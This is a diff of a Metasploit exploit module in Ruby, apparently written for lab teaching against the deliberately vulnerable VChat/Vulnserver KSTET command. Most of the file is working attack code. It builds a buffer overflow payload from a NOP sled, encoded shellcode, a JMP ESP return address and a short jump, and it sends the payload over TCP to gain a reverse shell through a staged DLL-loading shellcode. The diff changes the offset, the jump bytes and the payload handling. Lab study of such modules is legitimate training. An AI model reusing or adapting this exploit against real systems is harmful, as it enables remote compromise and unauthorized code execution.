@@ -8,37 +8,35 @@
 ##
 # This module exploits the KSTET command of vulnerable chat server using a multistaged attack which loads a remote DLL.
 ##
+class MetasploitModule < Msf::Exploit::Remote   # This is a remote exploit module inheriting from the remote exploit class
+  Rank = NormalRanking  # Potential impact to the target
 
-class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
-  Rank = NormalRanking	# Potential impact to the target
+  include Msf::Exploit::Remote::Tcp     # Include remote tcp exploit module
 
-  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
-
-  def initialize(info = {})	# i.e. constructor, setting the initial values
+  def initialize(info = {})     # i.e. constructor, setting the initial values
     super(update_info(info,
-      'Name'           => 'VChat/Vulnserver Buffer Overflow-KSTET command MultiStage',	# Name of the target
-      'Description'    => %q{	# Explaining what the module does
-         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell.
+      'Name'           => 'VChat/Vulnserver Buffer Overflow-KSTET command MultiStage',  # Name of the target
+      'Description'    => %q{   # Explaining what the module does
+         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
       },
-      'Author'         => [ 'fxw' ],	## Hacker name
+      'Author'         => [ 'fxw' ],    ## Hacker name
       'License'        => MSF_LICENSE,
-      'References'     =>	# References for the vulnerability or exploit
+      'References'     =>       # References for the vulnerability or exploit
         [
           #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
           [ 'URL', 'https://github.com/DaintyJet/VChat_KSTET_DLL' ]
-
         ],
       'Privileged'     => false,
       'DefaultOptions' =>
         {
           'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done
         },
-      'Payload'        =>	# How to encode and generate the payload
+      'Payload'        =>       # How to encode and generate the payload
         {
-          'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
+          'BadChars' => "\x00\x0a\x0d"  # Bad characters to avoid in generated shellcode
         },
-      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
-      'Targets'        =>	#  targets for many exploits
+      'Platform'       => 'Win',        # Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
+      'Targets'        =>       #  targets for many exploits
       [
         [ 'EssFuncDLL-JMPESP',
           {
@@ -47,31 +45,32 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
         ]
       ],
       'DefaultTarget'  => 0,
-      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
+      'DisclosureDate' => 'Mar. 30, 2022'))     # When the vulnerability was disclosed in public
 
       register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
           [
-          OptInt.new('RETOFFSET_KSTET', [true, 'Offset of Return Address in function KSTET', 135]),
-          OptString.new('SHORT_JUMP', [true, 'Short Jump, Hex string', "\xeb\xb8"]),
+          OptInt.new('RETOFFSET_KSTET', [true, 'Offset of Return Address in function KSTET', 58]),
+          OptString.new('SHORT_JUMP', [true, 'Short Jump, Hex string', "\xeb\xc5"]),
           Opt::RPORT(9999),
           Opt::RHOSTS('192.168.7.191')
       ])
   end
-
-  def exploit	# Actual exploit
+  def exploit   # Actual exploit
     print_status("Connecting to target...")
-    connect	# Connect to the target
+    connect     # Connect to the target
 
     short_jump = datastore['SHORT_JUMP'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
-    shellcode = payload.encode()
+    if datastore['PAYLOADSTR'] && !datastore['PAYLOADSTR'].empty?
+      shellcode = payload.encoded.gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
+    else
+      shellcode = payload.encoded
+    end
 
-    outbound_stage_1 = 'KSTET /.:/' + "\x90"*8 + shellcode + "\x90"*(datastore['RETOFFSET_KSTET'] - 8 - shellcode.length()) + [target['jmpesp']].pack('V') + short_jump  # Create the malicious string that will be sent to the target
+    outbound_stage_1 = 'KSTET ' + "\x90"*8 + shellcode + "\x90"*(datastore['RETOFFSET_KSTET'] - 8 - shellcode.length()) + [target['jmpesp']].pack('V') + short_jump  # Create the malicious string that will be sent to the target
 
     print_status("Sending First Stage LoadLibraryA Custom Shellcode -- Load From File!")
-    sock.puts(outbound_stage_1)	# Send the attacking payload
+    sock.puts(outbound_stage_1) # Send the attacking payload
 
     disconnect
   end
 end
-
-
